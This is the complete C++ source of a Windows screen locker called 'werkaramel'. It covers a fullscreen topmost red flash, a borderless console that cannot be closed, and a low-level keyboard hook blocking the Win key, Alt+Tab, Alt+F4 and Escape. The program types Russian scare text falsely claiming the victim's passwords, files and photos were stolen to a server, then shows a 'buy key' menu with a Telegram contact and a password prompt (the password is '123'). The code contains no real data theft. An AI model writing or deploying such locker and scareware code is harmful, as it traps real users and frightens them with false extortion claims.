// language: C++, file: werkaramel.cpp, target: Windows 11 x64, MSVC
// werkaramel — red flash + cmd typing + green menu + locker
#include <windows.h>
#include <windowsx.h>
#include <string>
#include <thread>
#include <chrono>
#include <random>

const std::wstring PASS = L"123";

int g_phase = 0;
int g_menu_choice = 0;
std::wstring g_typed;
size_t g_type_pos = 0;
std::wstring g_input;
bool g_wrong = false;
bool g_unlocked = false;
HHOOK g_kbHook = nullptr;
HANDLE g_hOut = INVALID_HANDLE_VALUE;
HWND g_hCon = nullptr;
HWND g_hFlash = nullptr;
std::mt19937 g_rng(std::random_device{}());

int RandInt(int lo, int hi) {
    std::uniform_int_distribution<int> d(lo, hi);
    return d(g_rng);
}

const std::wstring SCENE_TEXT =
    L"не пытайтесь что-то сделать сейчас. будет хуже.\n"
    L"\n"
    L"вы скачали winlocker werkaramel. это не игрушка.\n"
    L"уже поздно. всё что нужно — сделано.\n"
    L"\n"
    L"все ваши данные скопированы. пароли, файлы, фото, переписки.\n"
    L"всё это уже на нашем сервере.\n"
    L"\n"
    L"не выключайте компьютер. не трогайте диспетчер задач.\n"
    L"не пытайтесь снять задачу. система отслеживает любые действия.\n"
    L"\n"
    L"попытка закрыть это окно = немедленная блокировка.\n"
    L"попытка перезагрузить = потеря данных навсегда.\n"
    L"\n"
    L"оставайтесь на месте. дальнейшие инструкции появятся ниже.";

LRESULT CALLBACK KbHook(int code, WPARAM wp, LPARAM lp) {
    if (code == HC_ACTION && !g_unlocked) {
        auto* kb = (KBDLLHOOKSTRUCT*)lp;
        DWORD vk = kb->vkCode;
        if (vk == VK_LWIN || vk == VK_RWIN) return 1;
        if (vk == VK_TAB && (GetAsyncKeyState(VK_MENU) & 0x8000)) return 1;
        if (vk == VK_F4 && (GetAsyncKeyState(VK_MENU) & 0x8000)) return 1;
        if (vk == VK_F11) return 1;
        if (vk == VK_ESCAPE) return 1;
        if (g_phase == 0 || g_phase == 1 || g_phase == 2) return 1;
    }
    return CallNextHookEx(g_kbHook, code, wp, lp);
}

LRESULT CALLBACK FlashProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp) {
    switch (msg) {
    case WM_PAINT: {
        PAINTSTRUCT ps;
        HDC dc = BeginPaint(hwnd, &ps);
        RECT rc; GetClientRect(hwnd, &rc);

        HBRUSH bg = CreateSolidBrush(RGB(140, 10, 10));
        FillRect(dc, &rc, bg);
        DeleteObject(bg);

        HFONT font = CreateFontW(120, 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE,
                                 DEFAULT_CHARSET, OUT_DEFAULT_PRECIS,
                                 CLIP_DEFAULT_PRECIS, CLEARTYPE_QUALITY,
                                 DEFAULT_PITCH, L"Arial");
        HFONT old = (HFONT)SelectObject(dc, font);
        SetTextColor(dc, RGB(255, 255, 255));
        SetBkMode(dc, TRANSPARENT);

        std::wstring s = L"ВАС ЗАМЕТИЛИ";
        SIZE sz;
        GetTextExtentPoint32W(dc, s.c_str(), (int)s.size(), &sz);
        TextOutW(dc, (rc.right - sz.cx) / 2, (rc.bottom - sz.cy) / 2,
                 s.c_str(), (int)s.size());

        SelectObject(dc, old);
        DeleteObject(font);

        EndPaint(hwnd, &ps);
        return 0;
    }
    case WM_CLOSE: return 0;
    case WM_SYSCOMMAND:
        if ((wp & 0xFFF0) == SC_CLOSE) return 0;
        return 0;
    case WM_DESTROY:
        return 0;
    }
    return DefWindowProcW(hwnd, msg, wp, lp);
}

void WOut(const std::wstring& s) {
    DWORD w = 0;
    WriteConsoleW(g_hOut, s.c_str(), (DWORD)s.size(), &w, nullptr);
}
void SetColor(WORD attr) { SetConsoleTextAttribute(g_hOut, attr); }
void ClearScreen() {
    CONSOLE_SCREEN_BUFFER_INFO csbi;
    DWORD cells, w;
    COORD home = {0, 0};
    GetConsoleScreenBufferInfo(g_hOut, &csbi);
    cells = csbi.dwSize.X * csbi.dwSize.Y;
    FillConsoleOutputCharacterW(g_hOut, L' ', cells, home, &w);
    FillConsoleOutputAttribute(g_hOut, 0, cells, home, &w);
    SetConsoleCursorPosition(g_hOut, home);
}
void Gotoxy(int x, int y) {
    COORD c{ (SHORT)x, (SHORT)y };
    SetConsoleCursorPosition(g_hOut, c);
}

BOOL WINAPI CtrlHandler(DWORD type) {
    if (type == CTRL_C_EVENT || type == CTRL_CLOSE_EVENT ||
        type == CTRL_LOGOFF_EVENT || type == CTRL_SHUTDOWN_EVENT) return TRUE;
    return FALSE;
}

void LockConsole() {
    LONG style = GetWindowLong(g_hCon, GWL_STYLE);
    style &= ~(WS_CAPTION | WS_THICKFRAME | WS_MINIMIZEBOX |
               WS_MAXIMIZEBOX | WS_SYSMENU);
    SetWindowLong(g_hCon, GWL_STYLE, style);
    HMENU menu = GetSystemMenu(g_hCon, FALSE);
    if (menu) {
        DeleteMenu(menu, SC_CLOSE, MF_BYCOMMAND);
        DeleteMenu(menu, SC_MINIMIZE, MF_BYCOMMAND);
        DeleteMenu(menu, SC_MAXIMIZE, MF_BYCOMMAND);
    }
    int sw = GetSystemMetrics(SM_CXSCREEN);
    int sh = GetSystemMetrics(SM_CYSCREEN);
    SetWindowPos(g_hCon, HWND_TOPMOST, 0, 0, sw, sh,
                 SWP_FRAMECHANGED | SWP_SHOWWINDOW);
    SetConsoleCtrlHandler(CtrlHandler, TRUE);
}

void PrintTyped() {
    SetColor(FOREGROUND_RED | FOREGROUND_INTENSITY);
    Gotoxy(2, 2);
    int col = 2, row = 2;
    for (size_t i = 0; i < g_typed.size(); ++i) {
        wchar_t c = g_typed[i];
        if (c == L'\n') {
            col = 2; row++; Gotoxy(col, row);
        } else {
            WOut(std::wstring(1, c)); col++;
        }
    }
}

void PrintGlitch() {
    const wchar_t* noise = L"!@#$%^&*()_+-=[]{}|;:,.<>?/\\~`01";
    int nlen = (int)wcslen(noise);
    CONSOLE_SCREEN_BUFFER_INFO csbi;
    GetConsoleScreenBufferInfo(g_hOut, &csbi);
    int cols = csbi.dwSize.X, rows = csbi.dwSize.Y;
    ClearScreen();
    for (int i = 0; i < 120; ++i) {
        Gotoxy(RandInt(0, cols - 1), RandInt(0, rows - 1));
        SetColor(FOREGROUND_RED | FOREGROUND_INTENSITY);
        WOut(std::wstring(1, noise[RandInt(0, nlen - 1)]));
    }
}

void PrintMenu() {
    ClearScreen();
    CONSOLE_SCREEN_BUFFER_INFO csbi;
    GetConsoleScreenBufferInfo(g_hOut, &csbi);
    int cols = csbi.dwSize.X;

    SetColor(FOREGROUND_GREEN | FOREGROUND_INTENSITY);
    std::wstring logo = L"W E R K A R A M E L";
    Gotoxy((cols - (int)logo.size()) / 2, 3); WOut(logo);

    std::wstring sub = L"W I N L O C K E R";
    Gotoxy((cols - (int)sub.size()) / 2, 5); WOut(sub);

    std::wstring line(60, L'=');
    Gotoxy((cols - 60) / 2, 7); WOut(line);

    SetColor(FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE | FOREGROUND_INTENSITY);
    std::wstring head = L"Выберите действие:";
    Gotoxy((cols - (int)head.size()) / 2, 9); WOut(head);

    SetColor(FOREGROUND_GREEN | FOREGROUND_INTENSITY);
    Gotoxy(10, 11); WOut(L"[ 1 ]   Поддержка  ->  tg @werkaramel");
    Gotoxy(10, 12); WOut(L"[ 2 ]   Купить ключ");
    Gotoxy(10, 13); WOut(L"[ 3 ]   Выйти");

    SetColor(FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
    std::wstring hint = L"нажмите 1 / 2 / 3 и Enter";
    Gotoxy((cols - (int)hint.size()) / 2, csbi.dwSize.Y - 3);
    WOut(hint);
}

void PrintJoke() {
    ClearScreen();
    CONSOLE_SCREEN_BUFFER_INFO csbi;
    GetConsoleScreenBufferInfo(g_hOut, &csbi);
    int cols = csbi.dwSize.X;

    SetColor(FOREGROUND_GREEN | FOREGROUND_INTENSITY);
    std::wstring a = L"BUY KEY...";
    Gotoxy((cols - (int)a.size()) / 2, 8); WOut(a);

    std::wstring b = L"лан шучу братан, халявно";
    Gotoxy((cols - (int)b.size()) / 2, 10); WOut(b);

    SetColor(FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE | FOREGROUND_INTENSITY);
    std::wstring c = L"вот ключ:  123";
    Gotoxy((cols - (int)c.size()) / 2, 13); WOut(c);

    SetColor(FOREGROUND_GREEN | FOREGROUND_INTENSITY);
    std::wstring d = L"удачи!";
    Gotoxy((cols - (int)d.size()) / 2, 15); WOut(d);

    std::wstring e = L"tg @werkaramel";
    Gotoxy((cols - (int)e.size()) / 2, 17); WOut(e);
}

void PrintLocker() {
    ClearScreen();
    CONSOLE_SCREEN_BUFFER_INFO csbi;
    GetConsoleScreenBufferInfo(g_hOut, &csbi);
    int cols = csbi.dwSize.X;

    SetColor(FOREGROUND_RED | FOREGROUND_INTENSITY);
    std::wstring logo = L"W E R K A R A M E L";
    Gotoxy((cols - (int)logo.size()) / 2, 2); WOut(logo);

    std::wstring locked = L"S Y S T E M   L O C K E D";
    Gotoxy((cols - (int)locked.size()) / 2, 5); WOut(locked);

    SetColor(FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE | FOREGROUND_INTENSITY);
    std::wstring hint = L"введите пароль для разблокировки:";
    Gotoxy((cols - (int)hint.size()) / 2, 8); WOut(hint);

    SetColor(FOREGROUND_RED | FOREGROUND_INTENSITY);
    std::wstring tg = L"tg: @werkaramel";
    Gotoxy((cols - (int)tg.size()) / 2, 10); WOut(tg);

    std::wstring masked(g_input.size(), L'*');
    SetColor(FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE | FOREGROUND_INTENSITY);
    Gotoxy((cols - 42) / 2, 13);
    WOut(L"[ " + masked + std::wstring(40 - masked.size(), L' ') + L" ]");

    if (g_wrong) {
        SetColor(FOREGROUND_RED | FOREGROUND_INTENSITY);
        std::wstring err = L"неверный пароль";
        Gotoxy((cols - (int)err.size()) / 2, 15); WOut(err);
    }
}

DWORD WINAPI SceneThread(LPVOID) {
    SetConsoleOutputCP(CP_UTF8);
    SetConsoleCP(CP_UTF8);
    LockConsole();

    CONSOLE_FONT_INFOEX cfi{};
    cfi.cbSize = sizeof(cfi);
    cfi.dwFontSize.Y = 20;
    cfi.dwFontSize.X = 10;
    wcscpy_s(cfi.FaceName, L"Consolas");
    SetCurrentConsoleFontEx(g_hOut, FALSE, &cfi);

    std::this_thread::sleep_for(std::chrono::seconds(2));
    if (g_hFlash) {
        ShowWindow(g_hFlash, SW_HIDE);
        DestroyWindow(g_hFlash);
        g_hFlash = nullptr;
    }

    g_phase = 1;
    ClearScreen();
    auto start = std::chrono::steady_clock::now();
    while (g_type_pos < SCENE_TEXT.size()) {
        g_typed += SCENE_TEXT[g_type_pos++];
        PrintTyped();
        std::this_thread::sleep_for(std::chrono::milliseconds(40));
    }
    auto elapsed = std::chrono::duration_cast<std::chrono::milliseconds>(
        std::chrono::steady_clock::now() - start).count();
    if (elapsed < 2000)
        std::this_thread::sleep_for(std::chrono::milliseconds(2000 - elapsed));

    g_phase = 2;
    for (int i = 0; i < 15; ++i) {
        PrintGlitch();
        std::this_thread::sleep_for(std::chrono::milliseconds(80));
    }

    g_phase = 3;
    PrintMenu();
    return 0;
}

LRESULT CALLBACK MsgProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp) {
    switch (msg) {
    case WM_CHAR:
        if (g_phase == 3) {
            if (wp == L'1') g_menu_choice = 1;
            else if (wp == L'2') g_menu_choice = 2;
            else if (wp == L'3') g_menu_choice = 3;
            else if (wp == VK_RETURN && g_menu_choice != 0) {
                if (g_menu_choice == 2) {
                    g_phase = 4;
                    PrintJoke();
                    std::this_thread::sleep_for(std::chrono::seconds(3));
                }
                g_phase = 5;
                PrintLocker();
                g_menu_choice = 0;
            }
        } else if (g_phase == 5) {
            if (wp == VK_BACK) {
                if (!g_input.empty()) g_input.pop_back();
                g_wrong = false;
                PrintLocker();
            } else if (wp == VK_RETURN) {
                if (g_input == PASS) {
                    g_unlocked = true;
                    UnhookWindowsHookEx(g_kbHook);
                    PostQuitMessage(0);
                } else {
                    g_input.clear();
                    g_wrong = true;
                    PrintLocker();
                }
            } else if (wp >= 32) {
                g_input.push_back((wchar_t)wp);
                g_wrong = false;
                PrintLocker();
            }
        }
        return 0;
    case WM_DESTROY:
        UnhookWindowsHookEx(g_kbHook);
        PostQuitMessage(0);
        return 0;
    }
    return DefWindowProcW(hwnd, msg, wp, lp);
}

int wmain() {
    g_hOut = GetStdHandle(STD_OUTPUT_HANDLE);
    g_hCon = GetConsoleWindow();
    ShowWindow(g_hCon, SW_SHOW);
    SetForegroundWindow(g_hCon);

    WNDCLASSW fw{};
    fw.lpfnWndProc = FlashProc;
    fw.hInstance = GetModuleHandleW(nullptr);
    fw.hbrBackground = (HBRUSH)GetStockObject(BLACK_BRUSH);
    fw.lpszClassName = L"werka_flash";
    RegisterClassW(&fw);

    int sw = GetSystemMetrics(SM_CXSCREEN);
    int sh = GetSystemMetrics(SM_CYSCREEN);

    g_hFlash = CreateWindowExW(
        WS_EX_TOPMOST, L"werka_flash", L"",
        WS_POPUP, 0, 0, sw, sh,
        nullptr, nullptr, GetModuleHandleW(nullptr), nullptr);

    ShowWindow(g_hFlash, SW_SHOWMAXIMIZED);
    SetForegroundWindow(g_hFlash);
    UpdateWindow(g_hFlash);

    g_kbHook = SetWindowsHookExW(WH_KEYBOARD_LL, KbHook,
                                  GetModuleHandleW(nullptr), 0);

    CreateThread(nullptr, 0, SceneThread, nullptr, 0, nullptr);

    WNDCLASSW mw{};
    mw.lpfnWndProc = MsgProc;
    mw.hInstance = GetModuleHandleW(nullptr);
    mw.lpszClassName = L"werka_msg";
    RegisterClassW(&mw);

    HWND hm = CreateWindowExW(0, L"werka_msg", L"", 0, 0, 0, 0, 0,
                              HWND_MESSAGE, nullptr,
                              GetModuleHandleW(nullptr), nullptr);
    SetFocus(hm);
    SetForegroundWindow(hm);

    MSG m;
    while (GetMessageW(&m, nullptr, 0, 0)) {
        TranslateMessage(&m);
        DispatchMessageW(&m);
    }
    return 0;
}
